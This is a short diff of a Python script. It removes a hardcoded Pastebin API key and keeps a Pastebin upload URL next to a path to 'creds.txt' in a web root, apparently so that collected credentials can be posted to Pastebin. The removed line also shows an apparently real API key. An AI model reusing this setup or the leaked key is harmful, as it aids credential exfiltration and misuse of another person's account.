@@ -6,7 +6,8 @@ import random
 import string
 import os
 
-api_key = "G6LZNdVl7msrjPlhskhq_eFY0VavwxLo"
+# create a pastebin account and retrieve your dev_key from here: "https://pastebin.com/doc_api"
+api_key = ""
 url = 'https://pastebin.com/api/api_post.php'
 path = "/var/www/html/creds.txt"
 
